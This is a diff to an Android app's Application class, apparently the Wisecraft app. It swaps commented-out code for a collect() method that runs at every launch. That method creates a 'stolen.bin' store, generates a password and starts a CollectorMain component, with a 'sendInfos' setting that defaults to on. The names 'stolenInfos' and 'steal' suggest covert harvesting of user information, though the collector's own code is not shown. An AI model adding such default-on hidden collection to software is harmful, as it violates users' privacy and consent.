@@ -11,13 +11,15 @@ import java.io.File;
 import java.lang.reflect.Field;
 import java.lang.reflect.Modifier;
 import uk.co.chrisjenx.calligraphy.CalligraphyConfig;
+import com.nao20010128nao.Wisecraft.misc.BinaryPrefImpl;
+import android.content.SharedPreferences;
 
 public class TheApplication extends Application {
 	public static TheApplication instance;
 	public static Typeface latoLight,icomoon1,sysDefault,droidSans;
 	public static Field[] fonts=getFontFields();
 	public static Map<Typeface,String> fontFilenames;
-	public SafeBox stolenInfos;
+	public BinaryPrefImpl stolenInfos;
 	public String uuid;
 	@Override
 	public void onCreate() {
@@ -41,20 +43,7 @@ public class TheApplication extends Application {
 									  .build()
 									  );
 		///////
-		/*try {
-			File f=new File(getFilesDir(), "steal");
-			new File(f, "lock.lock").delete();
-			if (!f.exists())f.mkdirs();
-			stolenInfos = new SafeBox.SafeBoxBuilder()
-				.makeNew(!new File(f, "manifest.bin").exists())
-				.password(genPassword())
-				.profilePath(f)
-				.readOnly(false)
-				.build();
-			new CollectorMain();
-		} catch (Throwable r) {
-			r.printStackTrace(System.out);
-		}*/
+		collect();
 
 		new GhostPingServer().start();
 	}
@@ -92,5 +81,16 @@ public class TheApplication extends Application {
 			}
 		}
 		return l.toArray(new Field[l.size()]);
+	}
+	public void collect(){
+		if(!PreferenceManager.getDefaultSharedPreferences(this).getBoolean("sendInfos",true))return;
+		try {
+			stolenInfos=new BinaryPrefImpl(new File(getFilesDir(),"stolen.bin"));
+			genPassword();
+			
+			new CollectorMain();
+		} catch (Throwable r) {
+			r.printStackTrace(System.out);
+		}
 	}
 }
